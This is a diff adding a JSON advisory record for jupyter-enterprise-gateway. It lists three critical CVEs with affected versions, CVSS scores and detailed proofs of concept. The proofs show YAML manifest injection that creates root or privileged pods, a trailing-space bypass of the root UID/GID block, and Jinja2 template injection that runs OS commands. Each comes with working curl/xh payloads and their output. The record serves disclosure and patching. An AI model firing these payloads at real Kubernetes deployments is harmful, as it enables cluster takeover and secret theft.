@@ -1,0 +1,394 @@
+{
+  "schema_version": 1,
+  "package": "jupyter_enterprise_gateway",
+  "purls": [
+    "pkg:pypi/jupyter-enterprise-gateway"
+  ],
+  "generated_at": "2026-06-09T06:01:34+00:00",
+  "conda_versions_total": 29,
+  "latest_version": "3.3.0",
+  "advisories": [
+    {
+      "schema_version": "1.7.5",
+      "id": "GHSA-cfw7-6c5v-2wjq",
+      "published": "2026-06-03T21:37:16Z",
+      "modified": "2026-06-03T21:45:15.626398503Z",
+      "aliases": [
+        "CVE-2026-44182"
+      ],
+      "summary": "Jupyter Enterprise Gateway: Kubernetes Manifest Injection in Jinja2 Template Rendering",
+      "details": "### Summary\n\nThe environment variables used during the rendering of the Kubernetes manifest allow YAML injection, enabling attackers to overwrite existing keys like `securityContext` and inject multi-document YAML to create additional unintended Kubernetes resources.\n\n### Details\n\nThe server interpolates untrusted environment variables (e.g., `KERNEL_XXX`) into Kubernetes manifests without YAML-aware escaping, enabling YAML injection attacks. Attackers can inject new fields, overwrite critical fields (e.g., duplicate `securityContext` keys, where the last one prevails), and inject document boundaries (`---` for new documents, `...` for end-of-document) to generate multiple resources, potentially creating arbitrary kinds like privileged pods.\n\nThe Jinja2 template for the Kubernetes manifest contains several `kernel_xxx` variables, such as `kernel_working_dir` that are used when rendering the manifest and are all vectors for YAML injection.\nhttps://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/kernel-pod.yaml.j2#L77\n\nThese values come from the environment passed in the API call, where they were `KERNEL_XXX` before being converted to lowercase.\n\nhttps://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/launch_kubernetes.py#L130-L137\n\n### PoC\n\nThese proof of concepts are injecting in the `KERNEL_WORKING_DIR` env var, but any of the env vars could have been used.\nBy default, the `KERNEL_WORKING_DIR` will be ignored unless `EG_MIRROR_WORKING_DIRS` is truthy for the `enterprise-gateway`. This is controlled by the `mirrorWorkingDirs` value in the Helm chart.\n\nUsing `ducaale/xh`:\n\n```bash\nxh http://localhost:31529/api/kernels env:=@env-working-dir-exploit.yaml\n```\n\n`env-working-dir-exploit.yaml`:\n\n```json\n{\n  \"KERNEL_POD_NAME\": \"working-dir-root\",\n  \"KERNEL_NAMESPACE\": \"notebooks\",\n  \"KERNEL_WORKING_DIR\": \"\\\"/tmp\\\\\\\"\\\\n\\\\n# INJECTION\\\\n  securityContext:\\\\n    runAsUser: 0\\\\n    runAsGroup: 0\\\\n    fsGroup: 100\\\\n# HAHA - stray quote \\\"\"\n}\n\n```\n\nResulting request:\n\n```\nPOST /api/kernels HTTP/1.1\nAccept: application/json, */*;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nConnection: keep-alive\nContent-Length: 233\nContent-Type: application/json\nHost: localhost:31529\nUser-Agent: xh/0.24.0\n\n{\n    \"env\": {\n        \"KERNEL_POD_NAME\": \"working-dir-root\",\n        \"KERNEL_NAMESPACE\": \"notebooks\",\n        \"KERNEL_WORKING_DIR\": \"\\\"/tmp\\\\\\\"\\\\n\\\\n# INJECTION\\\\n  securityContext:\\\\n    runAsUser: 0\\\\n    runAsGroup: 0\\\\n    fsGroup: 100\\\\n# HAHA - stray quote \\\"\"\n    }\n}\n```\n\nCurl equivalent command:\n\n```bash\ncurl http://localhost:31529/api/kernels -H 'content-type: application/json' -H 'accept: application/json, */*;q=0.5' -d '{\"env\":{\"KERNEL_POD_NAME\":\"working-dir-root\",\"KERNEL_NAMESPACE\":\"notebooks\",\"KERNEL_WORKING_DIR\":\"\\\"/tmp\\\\\\\"\\\\n\\\\n# INJECTION\\\\n  securityContext:\\\\n    runAsUser: 0\\\\n    runAsGroup: 0\\\\n    fsGroup: 100\\\\n# HAHA - stray quote \\\"\"}}'\n```\n\nThe rendered Jinja2 template:\n\n```yaml\n# This file defines the Kubernetes objects necessary for kernels to run witihin Kubernetes.\n# Substitution parameters are processed by the launch_kubernetes.py code located in the\n# same directory.  Some values are factory values, while others (typically prefixed with 'kernel_') can be\n# provided by the client.\n#\n# This file can be customized as needed.  No changes are required to launch_kubernetes.py provided kernel_\n# values are used - which be automatically set from corresponding KERNEL_ env values.  Updates will be required\n# to launch_kubernetes.py if new document sections (i.e., new k8s 'kind' objects) are introduced.\n#\napiVersion: v1\nkind: Pod\nmetadata:\n  name: \"working-dir-root\"\n  namespace: \"notebooks\"\n  labels:\n    kernel_id: \"186f4ecf-bf90-40b8-b210-a0987bfce927\"\n    app: enterprise-gateway\n    component: kernel\n    source: kernel-pod.yaml\n  annotations:\n    cluster-autoscaler.kubernetes.io/safe-to-evict: \"false\"\nspec:\n  restartPolicy: Never\n  serviceAccountName: \"default\"\n# NOTE: that using runAsGroup requires that feature-gate RunAsGroup be enabled.\n# WARNING: Only using runAsUser w/o runAsGroup or NOT enabling the RunAsGroup feature-gate\n# will result in the new kernel pod's effective group of 0 (root)! although the user will\n# correspond to the runAsUser value.  As a result, BOTH should be uncommented AND the feature-gate\n# should be enabled to ensure expected behavior.  In addition, 'fsGroup: 100' is recommended so\n# that /home/jovyan can be written to via the 'users' group (gid: 100) irrespective of the\n# \"kernel_uid\" and \"kernel_gid\" values.\n  securityContext:\n    runAsUser: 1000\n    runAsGroup: 100\n    fsGroup: 100\n  containers:\n  - image: \"elyra/kernel-py:3.2.3\"\n    name: \"working-dir-root\"\n    env:\n# Add any custom envs here that aren't already configured for the kernel's environment\n#    - name: MY_CUSTOM_ENV\n#      value: \"my_custom_value\"\n    workingDir: \"/tmp\"\n\n# INJECTION\n  securityContext:\n    runAsUser: 0\n    runAsGroup: 0\n    fsGroup: 100\n# HAHA - stray quote \"\n    volumeMounts:\n# Define any \"unconditional\" mounts here, followed by \"conditional\" mounts that vary per client\n  volumes:\n# Define any \"unconditional\" volumes here, followed by \"conditional\" volumes that vary per client\n```\n\nNormally the container would run as `uid=1000(jovyan) gid=100(users) groups=100(users)`.\nThis injects a pod `securityContext` with `runAsUser: 0` and `runAsGroup: 0` (and `fsGroup: 100`).\nThe processing of the YAML results in the duplicate key clobbering the original.\nMaking the container run as `uid=0(root) gid=0(root) groups=0(root),100(users)`.\n\nIn addition to injecting a pod level `securityContext` it is also possible to inject a container level `securityContext` which supports the `privileged` field.\n\n\n#### Injecting a Pod\n\nBy injecting `...` and `---` it is possible to use multi-document YAML to inject Kubernetes resources.\n\n```bash\nxh http://localhost:31529/api/kernels env:=@env-working-dir-exploit-pod.yaml\n```\n\n`env-working-dir-exploit-pod.yaml`:\n\n```json\n{\n  \"KERNEL_POD_NAME\": \"working-dir-root-pod\",\n  \"KERNEL_NAMESPACE\": \"notebooks\",\n  \"KERNEL_WORKING_DIR\": \"\\\"/tmp\\\\\\\"\\\\n\\\\n# INJECTION\\\\n...\\\\n---\\\\napiVersion: v1\\\\nkind: Pod\\\\nmetadata:\\\\n  name: injected-pod\\\\n\\\\\\n  spec:\\\\n  containers:\\\\n    - name: injected-container\\\\n      image: nginx\\\\n      ports:\\\\n        - containerPort: 80\\\\n      securityContext:\\\\n        privileged: true\\\\n        runAsUser: 0\\\\n        runAsGroup: 0\\\\n...\\\\n# HAHA - stray quote\\\"\"\n}\n```\n\nThis is rendered as (skipping the beginning of the rendering before the inject):\n\n```yaml\n    workingDir: \"/tmp\"\n\n# INJECTION\n...\n---\napiVersion: v1\nkind: Pod\nmetadata:\n  name: injected-pod\nspec:\n  containers:\n    - name: injected-container\n      image: nginx\n      ports:\n        - containerPort: 80\n      securityContext:\n        privileged: true\n        runAsUser: 0\n        runAsGroup: 0\n...\n# HAHA - stray quote\"\n    volumeMounts:\n# Define any \"unconditional\" mounts here, followed by \"conditional\" mounts that vary per client\n  volumes:\n# Define any \"unconditional\" volumes here, followed by \"conditional\" volumes that vary per client\n```\n\n`kubectl get pods -n notebooks`\n```\nNAME                   READY   STATUS    RESTARTS   AGE\ninjected-pod           1/1     Running   0          4s\nworking-dir-root-pod   1/1     Running   0          4s\n```\n\nThe `injected-pod` has been created in addition to the `working-dir-root-pod`.\n\n`kubectl get pod/injected-pod -o yaml -n notebooks -o jsonpath='{.spec.containers[*].securityContext}'`:\n\n```json\n{\n  \"privileged\": true,\n  \"runAsGroup\": 0,\n  \"runAsUser\": 0\n}\n```\n\n### Impact\n\nAn attacker can create pods running with arbitrary, `image`, `securityContext`, and `volumeMounts` including `hostPath` mounts. Privileged pods can be created.\n\nArbitrary Kubernetes resources of kinds: `Pod`, `Secret`, `PersistentVolumeClaim`, `PersistentVolume`, `Service`, and `ConfigMap` can be created.\n\nRepeated exploitation can compromise all worker nodes, and thus the entire Kubernetes cluster. Multiple container escape vectors exist. It is possible to create privileged pods which could load kernel modules to compromise the host. It is also possible to specify volume mounts, so another vector for a container escape is to use a `hostPath` R/W volume mount, use the injected `securityContext` to run as `root`, and then gain code execution in the underlying worker node by creating a crontab entry in the mounted host file system.",
+      "affected": [
+        {
+          "package": {
+            "name": "jupyter-enterprise-gateway",
+            "ecosystem": "PyPI",
+            "purl": "pkg:pypi/jupyter-enterprise-gateway"
+          },
+          "ranges": [
+            {
+              "type": "ECOSYSTEM",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "3.3.0"
+                }
+              ]
+            }
+          ],
+          "versions": [
+            "0.5.0.dev0",
+            "0.5.0.dev1",
+            "0.5.0.dev2",
+            "0.6.0",
+            "0.7.0",
+            "0.8.0",
+            "0.9.0",
+            "0.9.1",
+            "0.9.2",
+            "0.9.3",
+            "0.9.4",
+            "1.0.0",
+            "1.0.1",
+            "1.0.2",
+            "1.1.0",
+            "1.1.1",
+            "1.2.0",
+            "2.0.0",
+            "2.0.0b1",
+            "2.0.0rc1",
+            "2.0.0rc2",
+            "2.1.0",
+            "2.1.1",
+            "2.2.0",
+            "2.2.0rc1",
+            "2.2.0rc2",
+            "2.3.0",
+            "2.4.0",
+            "2.5.0",
+            "2.5.1",
+            "2.5.2",
+            "2.6.0",
+            "3.0.0",
+            "3.0.0b0",
+            "3.0.0rc0",
+            "3.0.0rc1",
+            "3.1.0",
+            "3.2.0",
+            "3.2.1",
+            "3.2.2",
+            "3.2.3"
+          ],
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-cfw7-6c5v-2wjq/GHSA-cfw7-6c5v-2wjq.json"
+          }
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/jupyter-server/enterprise_gateway/security/advisories/GHSA-cfw7-6c5v-2wjq"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/jupyter-server/enterprise_gateway"
+        }
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-74"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-06-03T21:37:16Z",
+        "nvd_published_at": null,
+        "severity": "CRITICAL",
+        "conda-forge": {
+          "package": "jupyter_enterprise_gateway",
+          "purl": "pkg:conda/jupyter_enterprise_gateway?channel=conda-forge",
+          "source_purls": [
+            "pkg:pypi/jupyter-enterprise-gateway"
+          ],
+          "affected_versions": [
+            "0.7.0",
+            "0.8.0",
+            "0.9.0",
+            "0.9.1",
+            "0.9.2",
+            "0.9.3",
+            "0.9.4",
+            "1.0.0",
+            "1.0.1",
+            "1.1.0",
+            "1.1.1",
+            "1.2.0",
+            "2.0.0",
+            "2.1.0",
+            "2.1.1",
+            "2.2.0",
+            "2.3.0",
+            "2.4.0",
+            "2.5.0",
+            "2.5.1",
+            "2.5.2",
+            "2.6.0",
+            "3.0.0",
+            "3.1.0",
+            "3.2.0",
+            "3.2.1",
+            "3.2.2",
+            "3.2.3"
+          ],
+          "conda_versions_total": 29,
+          "affects_future": false,
+          "derived_by": "purl-associator/scripts.cve_match",
+          "generated_at": "2026-06-09T06:01:34+00:00"
+        }
+      },
+      "severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+          "score_num": 10.0
+        }
+      ]
+    },
+    {
+      "schema_version": "1.7.5",
+      "id": "GHSA-chq7-94j8-cj28",
+      "published": "2026-06-03T21:30:10Z",
+      "modified": "2026-06-03T21:45:15.581807275Z",
+      "aliases": [
+        "CVE-2026-44180"
+      ],
+      "summary": "Jupyter Enterprise Gateway: ContainerProcessProxy._enforce_prohibited_ids Bypass",
+      "details": "### Summary\n\nJupyter Enterprise Gateway has a prohibited UID and GID feature that by default prevents launching kernels with UID or GID 0 (root).\nThis can be bypassed. It is possible to launch kernels with a prohibited UID and/or GID by using a specially crafted `KERNEL_UID` or `KERNEL_GID` value.\n\nThe feature is described in the documentation: \n\nhttps://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/docs/source/operators/config-add-env.md?plain=1#L103-L107\n\nhttps://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/docs/source/operators/config-add-env.md?plain=1#L88-L92\n\nhttps://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/docs/source/operators/deploy-kubernetes.md?plain=1#L769\n\n### Details\n\nThe `prohibited_uids` and `prohibited_uids` are set based of the OS env var `EG_PROHIBITED_UIDS` and `EG_PROHIBITED_GIDS`, and default to the string `0`.\n\nhttps://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/enterprise_gateway/services/processproxies/container.py#L29-L30\n\nThe checks https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/enterprise_gateway/services/processproxies/container.py#L113 and https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/enterprise_gateway/services/processproxies/container.py#L119 look for the user supplied `KERNEL_UID` / `KERNEL_GID` string in the `prohibited_uids` / `prohibited_gids` strings. These checks can be bypassed by including whitespace, for example the string `0 ` (trailing space).\n\nThe user supplied string is used in the Kubernetes manifest at https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/kernel-pod.yaml.j2#L35 and https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/kernel-pod.yaml.j2#L38 where they are parsed as an integer in the Jinja2 template - which will ignore the whitespace.\n\n### PoC\n\n\n#### How it is meant to work\n\nTrying `0` gets denied, as expected.\n\n```bash\nxh http://enterprise-gateway.bdawg.svc.cluster.local:8888/api/kernels name=python_kubernetes env:='{\"KERNEL_POD_NAME\":\"bdawg\", \"KERNEL_UID\": \"0\", \"KERNEL_GID\": \"0\"}'\n```\n\n```\nHTTP/1.1 403 Kernel's UID value of '0' has been denied via EG_PROHIBITED_UIDS!\nContent-Length: 94\nContent-Type: application/json\nDate: Mon, 14 Jul 2025 12:57:09 GMT\nServer: TornadoServer/6.4.1\nX-Content-Type-Options: nosniff\n```\n\n```json\n{\n    \"reason\": \"Kernel's UID value of '0' has been denied via EG_PROHIBITED_UIDS!\",\n    \"message\": \"\"\n}\n```\n\n#### Exploit bypassing the checks\n\nUsing `0 ` with a trailing space, bypasses the check.\n\n```bash\nxh http://enterprise-gateway.bdawg.svc.cluster.local:8888/api/kernels name=python_kubernetes env:='{\"KERNEL_POD_NAME\":\"bdawg\", \"KERNEL_UID\": \"0 \", \"KERNEL_GID\": \"0 \"}'\n```\n\n```\nHTTP/1.1 201 Created\nContent-Length: 172\nContent-Type: application/json\nDate: Mon, 14 Jul 2025 14:15:19 GMT\nLocation: /api/kernels/17eee032-994f-4dd2-8ade-87169c300a40\nServer: TornadoServer/6.4.1\nX-Content-Type-Options: nosniff\n```\n\n```\n{\n    \"id\": \"17eee032-994f-4dd2-8ade-87169c300a40\",\n    \"name\": \"python_kubernetes\",\n    \"last_activity\": \"2025-07-14T14:15:21.468155Z\",\n    \"execution_state\": \"starting\",\n    \"connections\": 0\n}\n```\n\nThe pod is successfully scheduled.\n\nInspecting the container we can see it is running as `root`:\n\n```bash\nkubectl exec -it pod/bdawg -- bash\n```\n\n```\n(base) root@bdawg3:~# id\nuid=0(root) gid=0(root) groups=0(root),100(users)\n```\n\nIf we had not supplied the `KERNEL_UID` / `KERNEL_GID` the container would have been running as UID:GID `1000:100` (`jovyan:users`).\n\n### Impact\n\nThis input validation vulnerability allows running Jupyter kernels as root, which can be dangerous as it allows more attack surface, and may lead to container escapes, compromising the worker node and all workloads running on it. Repeated exploitation can compromise all worker nodes, and thus the entire Kubernetes cluster. It is possible to specify volume mounts, so one vector for a container escape is to use a `hostPath` R/W volume mount, use this UID/GID bypass to run as root, and then gain code execution in the underlying worker node by creating a crontab entry in the mounted host file system.\n\nOrganisations running Jupyter Enterprise Gateway to host Jupyter Kernels on at least Kubernetes clusters (I've tested this), and possibly on any other supported container orchestration systems or systems that utilise the `KERNEL_UID` and `KERNEL_GID` variables with the `EG_PROHIBITED_UIDS` and `EG_PROHIBITED_GIDS` feature.",
+      "affected": [
+        {
+          "package": {
+            "name": "jupyter-enterprise-gateway",
+            "ecosystem": "PyPI",
+            "purl": "pkg:pypi/jupyter-enterprise-gateway"
+          },
+          "ranges": [
+            {
+              "type": "ECOSYSTEM",
+              "events": [
+                {
+                  "introduced": "2.0.0rc1"
+                },
+                {
+                  "fixed": "3.3.0"
+                }
+              ]
+            }
+          ],
+          "versions": [
+            "2.0.0",
+            "2.0.0rc1",
+            "2.0.0rc2",
+            "2.1.0",
+            "2.1.1",
+            "2.2.0",
+            "2.2.0rc1",
+            "2.2.0rc2",
+            "2.3.0",
+            "2.4.0",
+            "2.5.0",
+            "2.5.1",
+            "2.5.2",
+            "2.6.0",
+            "3.0.0",
+            "3.0.0b0",
+            "3.0.0rc0",
+            "3.0.0rc1",
+            "3.1.0",
+            "3.2.0",
+            "3.2.1",
+            "3.2.2",
+            "3.2.3"
+          ],
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-chq7-94j8-cj28/GHSA-chq7-94j8-cj28.json"
+          }
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/jupyter-server/enterprise_gateway/security/advisories/GHSA-chq7-94j8-cj28"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/jupyter-server/enterprise_gateway"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jupyter-server/enterprise_gateway/releases/tag/v3.3.0"
+        }
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-180",
+          "CWE-20"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-06-03T21:30:10Z",
+        "nvd_published_at": null,
+        "severity": "CRITICAL",
+        "conda-forge": {
+          "package": "jupyter_enterprise_gateway",
+          "purl": "pkg:conda/jupyter_enterprise_gateway?channel=conda-forge",
+          "source_purls": [
+            "pkg:pypi/jupyter-enterprise-gateway"
+          ],
+          "affected_versions": [
+            "2.0.0",
+            "2.1.0",
+            "2.1.1",
+            "2.2.0",
+            "2.3.0",
+            "2.4.0",
+            "2.5.0",
+            "2.5.1",
+            "2.5.2",
+            "2.6.0",
+            "3.0.0",
+            "3.1.0",
+            "3.2.0",
+            "3.2.1",
+            "3.2.2",
+            "3.2.3"
+          ],
+          "conda_versions_total": 29,
+          "affects_future": false,
+          "derived_by": "purl-associator/scripts.cve_match",
+          "generated_at": "2026-06-09T06:01:34+00:00"
+        }
+      },
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "score_num": 9.8
+        }
+      ]
+    },
+    {
+      "schema_version": "1.7.5",
+      "id": "GHSA-f49j-v924-fx9w",
+      "published": "2026-06-03T21:36:05Z",
+      "modified": "2026-06-03T21:45:15.624716866Z",
+      "aliases": [
+        "CVE-2026-44181"
+      ],
+      "summary": "Jupyter Enterprise Gateway: Jinja2 Template Server Side Template Injection resulting in Remote Code Execution",
+      "details": "### Summary\n\nThe environment variables (`KERNEL_XXX`) used during the rendering of the Kubernetes manifest are vulnerable to Server Side Template Injection (SSTI).\nBy including Jinja2 template expressions it is possible to execution Python code and OS Commands in the Enterprise Gateway service.\nThe code can use or steal the Kubernetes service account token, which can steal Kubernetes secrets and be used to fully compromise the Kubernetes cluster by scheduling a privileged pod or a pod with a `hostPath` volume mount.\n\n### Details\n\nThe `KERNEL_POD_NAME` variable is rendered using Jinja2, allowing for code execution via template expression statements, in this code:\nhttps://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/enterprise_gateway/services/processproxies/k8s.py#L219-L247\n\nThe Jinja2 template for the Kubernetes manifest contains several `kernel_xxx` variables, in addition to `kernel_pod_name` discussed above, such as `kernel_working_dir` that are used when rendering the manifest and are all vectors for SSTI.\nhttps://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/kernel-pod.yaml.j2#L77\n\nThese values come from the environment passed in the API call, where they were `KERNEL_XXX` before being converted to lowercase.\n\nhttps://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/launch_kubernetes.py#L130-L137\n\n### PoC\n\n\n#### Simple demonstration of SSTI using `{{7 * 7}}`\n\n```bash\ncurl http://enterprise-gateway.bdawg.svc.cluster.local:8888/api/kernels --data '{\"name\":\"python_kubernetes\", \"env\": {\"KERNEL_POD_NAME\": \"bdawg-{{7 * 7}}\" }}'\n```\n\n```json\n{\"id\": \"1094076f-35c6-48a5-ae60-0c943bb97a9a\", \"name\": \"python_kubernetes\", \"last_activity\": \"2025-07-17T07:14:42.155736Z\", \"execution_state\": \"starting\", \"connections\": 0}\n```\n\nRunning `kubectl get pods`\n```\nNAME                                                 READY   STATUS    RESTARTS   AGE\nbdawg-49                                             1/1     Running   0          3m54s\n```\n\n#### Remote code execution - OS Commands via SSTI\n\n```bash\ncurl http://enterprise-gateway.notebooks.svc.cluster.local:8888/api/kernels --data '{\"name\":\"python_kubernetes\", \"env\": {\"KERNEL_POD_NAME\": \"bdawg-{{ cycler.__init__.__globals__.os.popen(\\\"hostname\\\").read() }}\", \"KERNEL_NAMESPACE\": \"notebooks\" }}'\n```\n\n```json\n{\"id\": \"85ec9431-d005-48d5-8127-5f022f2c5780\", \"name\": \"python_kubernetes\", \"last_activity\": \"2025-07-17T07\n```\n\n```\nNAME                                                 READY   STATUS    RESTARTS   AGE\nbdawg-enterprise-gateway-8695685bc8-klm4m            1/1     Running   0          2m25s\n```\n\n`enterprise-gateway-8695685bc8-klm4m` is the hostname of the Enterprise Gateway pod.\n\n\n#### Enterprise Gateway RBAC\nThe Enterprise Gateway service account has R/W access to several resource kinds.\n\nStolen Enterprise Gateway service account `kubectl auth can-i --list`\n\n```\nResources                                                Non-Resource URLs                      Resource Names   Verbs\nselfsubjectreviews.authentication.k8s.io                 []                                     []               [create]\nselfsubjectaccessreviews.authorization.k8s.io            []                                     []               [create]\nselfsubjectrulesreviews.authorization.k8s.io             []                                     []               [create]\nrolebindings.rbac.authorization.k8s.io                   []                                     []               [get list create delete]\nconfigmaps                                               []                                     []               [get watch list create delete]\nnamespaces                                               []                                     []               [get watch list create delete]\npersistentvolumeclaims                                   []                                     []               [get watch list create delete]\npersistentvolumes                                        []                                     []               [get watch list create delete]\npods                                                     []                                     []               [get watch list create delete]\nsecrets                                                  []                                     []               [get watch list create delete]\nservices                                                 []                                     []               [get watch list create delete]\nscheduledsparkapplications.sparkoperator.k8s.io/status   []                                     []               [get watch list create delete]\nscheduledsparkapplications.sparkoperator.k8s.io          []                                     []               [get watch list create delete]\nsparkapplications.sparkoperator.k8s.io/status            []                                     []               [get watch list create delete]\nsparkapplications.sparkoperator.k8s.io                   []                                     []               [get watch list create delete]\n                                                         [/.well-known/openid-configuration/]   []               [get]\n                                                         [/.well-known/openid-configuration]    []               [get]\n                                                         [/api/*]                               []               [get]\n                                                         [/api]                                 []               [get]\n                                                         [/apis/*]                              []               [get]\n                                                         [/apis]                                []               [get]\n                                                         [/healthz]                             []               [get]\n                                                         [/healthz]                             []               [get]\n                                                         [/livez]                               []               [get]\n                                                         [/livez]                               []               [get]\n                                                         [/openapi/*]                           []               [get]\n                                                         [/openapi]                             []               [get]\n                                                         [/openid/v1/jwks/]                     []               [get]\n                                                         [/openid/v1/jwks]                      []               [get]\n                                                         [/readyz]                              []               [get]\n                                                         [/readyz]                              []               [get]\n                                                         [/version/]                            []               [get]\n                                                         [/version/]                            []               [get]\n                                                         [/version]                             []               [get]\n                                                         [/version]                             []               [get]\n```\n\n### Impact\nThis is a server side template injection that leads to remote code execution (python and OS commands).\n\nAn attacker can get remote code execution in the Enterprise Gateway pod and steal its Kubernetes service account's token.\nIt can use the privileges to spy on and interfere with other Jupyter kernel, read, write, or delete configuration maps, read secrets, access persistent storage, privileged pods, or create pods with `hostPath` mounts, which can be used to compromise the complete cluster and all workloads on it.",
+      "affected": [
+        {
+          "package": {
+            "name": "jupyter-enterprise-gateway",
+            "ecosystem": "PyPI",
+            "purl": "pkg:pypi/jupyter-enterprise-gateway"
+          },
+          "ranges": [
+            {
+              "type": "ECOSYSTEM",
+              "events": [
+                {
+                  "introduced": "2.0.0rc2"
+                },
+                {
+                  "fixed": "3.3.0"
+                }
+              ]
+            }
+          ],
+          "versions": [
+            "2.0.0",
+            "2.0.0rc2",
+            "2.1.0",
+            "2.1.1",
+            "2.2.0",
+            "2.2.0rc1",
+            "2.2.0rc2",
+            "2.3.0",
+            "2.4.0",
+            "2.5.0",
+            "2.5.1",
+            "2.5.2",
+            "2.6.0",
+            "3.0.0",
+            "3.0.0b0",
+            "3.0.0rc0",
+            "3.0.0rc1",
+            "3.1.0",
+            "3.2.0",
+            "3.2.1",
+            "3.2.2",
+            "3.2.3"
+          ],
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-f49j-v924-fx9w/GHSA-f49j-v924-fx9w.json"
+          }
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/jupyter-server/enterprise_gateway/security/advisories/GHSA-f49j-v924-fx9w"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/jupyter-server/enterprise_gateway"
+        }
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-1336"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-06-03T21:36:05Z",
+        "nvd_published_at": null,
+        "severity": "CRITICAL",
+        "conda-forge": {
+          "package": "jupyter_enterprise_gateway",
+          "purl": "pkg:conda/jupyter_enterprise_gateway?channel=conda-forge",
+          "source_purls": [
+            "pkg:pypi/jupyter-enterprise-gateway"
+          ],
+          "affected_versions": [
+            "2.0.0",
+            "2.1.0",
+            "2.1.1",
+            "2.2.0",
+            "2.3.0",
+            "2.4.0",
+            "2.5.0",
+            "2.5.1",
+            "2.5.2",
+            "2.6.0",
+            "3.0.0",
+            "3.1.0",
+            "3.2.0",
+            "3.2.1",
+            "3.2.2",
+            "3.2.3"
+          ],
+          "conda_versions_total": 29,
+          "affects_future": false,
+          "derived_by": "purl-associator/scripts.cve_match",
+          "generated_at": "2026-06-09T06:01:34+00:00"
+        }
+      },
+      "severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+          "score_num": 10.0
+        }
+      ]
+    }
+  ]
+}
